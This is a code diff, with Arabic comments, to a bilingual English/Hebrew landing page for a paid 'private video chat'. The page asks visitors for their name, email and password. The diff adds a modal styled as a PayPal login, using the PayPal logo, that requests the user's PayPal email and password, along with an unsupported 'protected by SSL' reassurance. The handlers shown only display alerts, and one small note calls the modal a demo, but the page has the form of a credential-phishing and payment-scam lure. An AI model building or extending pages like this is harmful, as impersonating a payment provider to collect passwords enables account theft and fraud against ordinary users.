@@ -130,6 +130,55 @@
       background-color: var(--main-color);
       color: #fff;
     }
+
+    /* أيقونات الدفع مع زر تبديل */
+    .payment-switcher {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 12px;
+      gap: 10px;
+    }
+
+    .payment-icon {
+      width: 64px;
+      height: auto;
+      cursor: pointer;
+      filter: drop-shadow(0 0 2px rgba(0,0,0,0.1));
+      transition: transform 0.3s ease;
+    }
+    .payment-icon:hover {
+      transform: scale(1.1);
+      filter: drop-shadow(0 0 5px rgba(0,0,0,0.3));
+    }
+
+    .switch-text {
+      font-size: 14px;
+      color: #555;
+      user-select: none;
+      cursor: pointer;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    /* رسالة الأمان */
+    .security-note {
+      margin-top: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-size: 14px;
+      color: #555;
+      font-weight: 600;
+      user-select: none;
+    }
+    .security-note img {
+      width: 20px;
+      height: 20px;
+      filter: drop-shadow(0 0 1px rgba(0,0,0,0.15));
+    }
+
     footer {
       text-align: center;
       margin: 40px 0;
@@ -137,6 +186,132 @@
       font-size: 14px;
       position: relative;
       z-index: 10;
+    }
+
+    /* مودال الدفع */
+    #paypal-modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0; top: 0;
+      width: 100vw; height: 100vh;
+      background-color: var(--modal-bg);
+      backdrop-filter: blur(3px);
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    #paypal-modal.active {
+      display: flex;
+    }
+    .modal-content {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 15px;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+      width: 320px;
+      max-width: 100%;
+      text-align: center;
+      position: relative;
+    }
+    .modal-content h2 {
+      margin-bottom: 20px;
+      color: #003087;
+    }
+    .modal-content .paypal-logo {
+      width: 120px;
+      margin-bottom: 20px;
+      max-width: 100%;
+      height: auto;
+    }
+    .modal-content form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .modal-content input[type="email"],
+    .modal-content input[type="password"] {
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    .modal-content button {
+      background: #0070ba;
+      color: white;
+      font-weight: 600;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+    .modal-content button:hover {
+      background: #004b80;
+    }
+    .modal-close {
+      position: absolute;
+      top: 12px;
+      right: 15px;
+      font-size: 22px;
+      font-weight: bold;
+      color: #555;
+      cursor: pointer;
+      user-select: none;
+      transition: color 0.3s ease;
+    }
+    .modal-close:hover {
+      color: var(--main-color);
+    }
+    .modal-note {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #777;
+    }
+
+    /* Responsive for mobile */
+    @media (max-width: 768px) {
+      #side-left, #side-right {
+        display: none; /* اخفاء الصور الجانبية في الموبايل */
+      }
+
+      .container {
+        width: 90%;
+        max-width: none;
+        margin: 40px auto;
+        padding: 20px;
+      }
+      input, select, button, .watch-now-btn {
+        font-size: 18px;
+        padding: 18px;
+      }
+      .payment-icon {
+        width: 80px;
+      }
+      .switch-text {
+        font-size: 16px;
+      }
+      .security-note {
+        font-size: 16px;
+      }
+
+      /* مودال */
+      .modal-content {
+        width: 90%;
+        max-width: 360px;
+        padding: 25px 30px;
+      }
+      .modal-content button {
+        font-size: 18px;
+        padding: 18px;
+      }
+      .modal-content input[type="email"],
+      .modal-content input[type="password"] {
+        font-size: 18px;
+        padding: 18px;
+      }
     }
   </style>
 </head>
@@ -155,7 +330,7 @@
 
   <div class="container">
     <h2 data-en="Join My Private Video Chat" data-he="הצטרף לשיחת וידאו פרטית"></h2>
-    <form action="#" method="POST">
+    <form id="mainForm" action="#" method="POST" autocomplete="off">
       <input type="text" name="Full Name" placeholder="Full Name" data-en="Full Name" data-he="שם מלא" required />
       <input type="email" name="Email" placeholder="Email Address" data-en="Email Address" data-he="דואר אלקטרוני" required />
       <input type="password" name="Password" placeholder="Password" data-en="Password" data-he="סיסמה" required />
@@ -169,6 +344,21 @@
         <option value="60 mins" data-en="60 Minutes - $50" data-he="60 דקות - $50">60 Minutes - $30</option>
       </select>
       <button type="submit" data-en="Pay with Visa" data-he="לקופה">Pay with Visa</button>
+
+      <!-- تبديل الدفع -->
+      <div class="payment-switcher" title="Click to switch payment method" aria-label="Switch payment method">
+        <img id="payment-icon" class="payment-icon" src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" />
+        <div id="switch-text" class="switch-text" data-en="Click to pay with PayPal" data-he="לחץ כדי לשלם עם PayPal">Click to pay with PayPal</div>
+      </div>
+
+      <!-- رسالة الأمان -->
+      <div class="security-note">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Font_Awesome_5_solid_lock.svg" alt="Lock" />
+        <span data-en="Your data is encrypted and protected by SSL." data-he="הנתונים שלך מוצפנים ומוגנים על ידי SSL.">
+          Your data is encrypted and protected by SSL.
+        </span>
+      </div>
+
       <a href="#" class="watch-now-btn" data-en="🎥 Watch Now" data-he="🎥 צפה עכשיו">🎥 Watch Now</a>
     </form>
   </div>
@@ -176,6 +366,24 @@
   <footer>
     <span data-en="All rights reserved." data-he="  אוקסאנה כל הזכויות שמורות.">&copy; 2025 Oksana Live Room</span>
   </footer>
+
+  <!-- مودال PayPal -->
+  <div id="paypal-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" tabindex="-1">
+    <div class="modal-content">
+      <span class="modal-close" aria-label="Close modal" role="button" tabindex="0">&times;</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo" class="paypal-logo" />
+      <h2 id="modal-title">PayPal Login</h2>
+      <form id="paypalForm" autocomplete="off">
+        <input type="email" name="email" placeholder="Email address" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
+      <div class="modal-note">
+        This is a demo page for PayPal payment simulation.<br />
+        No real transactions will occur.
+      </div>
+    </div>
+  </div>
 
   <script>
     let isHebrew = false;
@@ -206,6 +414,9 @@
 
       document.getElementById('lang-label').innerText = isHebrew ? 'English' : 'עברית';
       document.getElementById('lang-flag').src = isHebrew ? 'https://flagcdn.com/us.svg' : 'https://flagcdn.com/il.svg';
+
+      // تحديث نص تبديل الدفع
+      updateSwitchTextLanguage();
     }
 
     // مصفوفات الصور للجانبين
@@ -224,7 +435,6 @@
     let rightIndex = 0;
 
     function changeSideImages() {
-      // بداية تأثير ضبابي قبل التغيير
       const leftSide = document.getElementById('side-left');
       const rightSide = document.getElementById('side-right');
 
@@ -240,20 +450,110 @@
         leftSide.style.backgroundImage = `url('${leftImages[leftIndex]}')`;
         rightSide.style.backgroundImage = `url('${rightImages[rightIndex]}')`;
 
-        // إزالة تأثير الضباب والشفافية تدريجيًا
         leftSide.style.filter = 'blur(0)';
         rightSide.style.filter = 'blur(0)';
         leftSide.style.opacity = '0.20';
         rightSide.style.opacity = '0.20';
-      }, 500); // نصف ثانية ضباب قبل التغيير
+      }, 500);
     }
 
-    // تهيئة الصور أول مرة
     document.getElementById('side-left').style.backgroundImage = `url('${leftImages[0]}')`;
     document.getElementById('side-right').style.backgroundImage = `url('${rightImages[0]}')`;
 
-    // تغيير الصور كل 8 ثواني
     setInterval(changeSideImages, 8000);
+
+    // منطق تبديل الدفع
+    const paymentIcon = document.getElementById('payment-icon');
+    const switchText = document.getElementById('switch-text');
+
+    const payments = [
+      {
+        name: 'Visa',
+        img: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
+        buttonTextEn: 'Pay with Visa',
+        buttonTextHe: 'לקופה'
+      },
+      {
+        name: 'PayPal',
+        img: 'https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg',
+        buttonTextEn: 'Pay with PayPal',
+        buttonTextHe: 'שלם עם PayPal'
+      }
+    ];
+    let currentPayment = 0; // 0 = Visa, 1 = PayPal
+
+    function updatePaymentUI() {
+      paymentIcon.src = payments[currentPayment].img;
+      if (isHebrew) {
+        document.querySelector('button[type="submit"]').innerText = payments[currentPayment].buttonTextHe;
+      } else {
+        document.querySelector('button[type="submit"]').innerText = payments[currentPayment].buttonTextEn;
+      }
+    }
+
+    function updateSwitchTextLanguage() {
+      if (isHebrew) {
+        switchText.innerText = currentPayment === 0 ? 'לחץ כדי לשלם עם PayPal' : 'לחץ כדי לשלם עם Visa';
+      } else {
+        switchText.innerText = currentPayment === 0 ? 'Click to pay with PayPal' : 'Click to pay with Visa';
+      }
+    }
+
+    // عند الضغط على أيقونة الدفع لتبديل الطريقة
+    paymentIcon.addEventListener('click', () => {
+      currentPayment = (currentPayment + 1) % payments.length;
+      updatePaymentUI();
+      updateSwitchTextLanguage();
+    });
+
+    switchText.addEventListener('click', () => {
+      currentPayment = (currentPayment + 1) % payments.length;
+      updatePaymentUI();
+      updateSwitchTextLanguage();
+    });
+
+    // زر الدفع
+    const payButton = document.querySelector('button[type="submit"]');
+    const paypalModal = document.getElementById('paypal-modal');
+    const modalClose = document.querySelector('.modal-close');
+
+    payButton.addEventListener('click', function(event) {
+      event.preventDefault();
+
+      if (payments[currentPayment].name === 'PayPal') {
+        // افتح مودال بايبال
+        paypalModal.classList.add('active');
+        paypalModal.focus();
+      } else {
+        alert(isHebrew ? 'מעבד תשלום Visa (הדגמה)' : 'Processing Visa payment (demo)');
+      }
+    });
+
+    // اغلاق المودال
+    modalClose.addEventListener('click', () => {
+      paypalModal.classList.remove('active');
+    });
+
+    // اغلاق المودال بالضغط على ESC
+    window.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && paypalModal.classList.contains('active')) {
+        paypalModal.classList.remove('active');
+      }
+    });
+
+    // معالجة نموذج PayPal الوهمي
+    const paypalForm = document.getElementById('paypalForm');
+    paypalForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert(isHebrew 
+        ? 'תודה! פרטי תשלום PayPal התקבלו.' 
+        : 'Thank you! Your PayPal payment details have been received.');
+      paypalModal.classList.remove('active');
+      // هنا يمكن إعادة توجيه أو تنفيذ شيء آخر
+    });
+
+    applyLanguage();
+    updatePaymentUI();
   </script>
 </body>
 </html>
